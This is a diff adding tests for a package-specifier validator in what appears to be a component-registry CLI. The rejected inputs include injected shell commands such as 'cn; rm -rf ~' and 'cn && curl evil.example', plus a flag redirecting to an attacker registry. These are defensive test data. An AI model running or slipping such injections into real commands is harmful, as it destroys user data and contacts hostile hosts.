@@ -9,7 +9,12 @@ import {
 } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join, resolve } from "node:path";
-import { add, importedPackages, packageName } from "../src/add.ts";
+import {
+  add,
+  importedPackages,
+  isPackageSpec,
+  packageName,
+} from "../src/add.ts";
 import { indexSheet } from "../src/css.ts";
 import { targetPath, UTILS } from "../src/files.ts";
 import { detectAlias, parseLooseJson, readConfig } from "../src/project.ts";
@@ -293,6 +298,32 @@ describe("what the registry may write", () => {
       "/project/src/components/audio-ui/knob.tsx"
     );
     expect(at("~/src/lib/knob.ts")).toBe("/project/src/lib/knob.ts");
+  });
+});
+
+describe("the packages it installs", () => {
+  test.each([
+    "cn",
+    "class-variance-authority",
+    "@ui-sdk/core@0.1.0-beta.14",
+    "@scope/name.js@1.2.3",
+  ])("passes %p to the package manager", (spec) => {
+    expect(isPackageSpec(spec)).toBe(true);
+  });
+
+  test.each([
+    "--registry=https://evil.example",
+    "-g",
+    "cn; rm -rf ~",
+    "cn && curl evil.example",
+    "cn|calc",
+    "cn@^1.0.0",
+    "cn@>1 <2",
+    "../local",
+    "git+https://github.com/x/y.git",
+    "",
+  ])("refuses %p", (spec) => {
+    expect(isPackageSpec(spec)).toBe(false);
   });
 });
 
